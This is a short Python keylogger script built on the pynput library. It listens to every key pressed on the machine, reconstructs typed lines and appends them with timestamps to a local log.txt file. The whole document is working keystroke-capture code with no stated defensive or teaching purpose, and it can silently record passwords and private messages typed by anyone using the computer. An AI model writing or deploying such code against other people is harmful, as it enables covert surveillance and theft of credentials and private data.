from pynput.keyboard import Listener, Key
import time

buffer = ""
session_start = time.strftime("%Y-%m-%d %H:%M:%S")

def log_keystroke(key):
    global buffer
    try:
        if key == Key.space:
            buffer += ' '
        elif key == Key.enter:
            write_log(buffer)
            buffer = ''
        elif key == Key.backspace:
            buffer = buffer[:-1]
        elif hasattr(key, 'char'):
            buffer += key.char
        else:
            # Handle other special keys if needed
            pass
    except Exception as e:
        print(f"Error: {e}")

def write_log(text):
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
    with open("log.txt", "a") as log_file:
        log_file.write(f"[{timestamp}] {text}\n")

# Listen for key presses
with Listener(on_press=log_keystroke) as listener:
    listener.join()

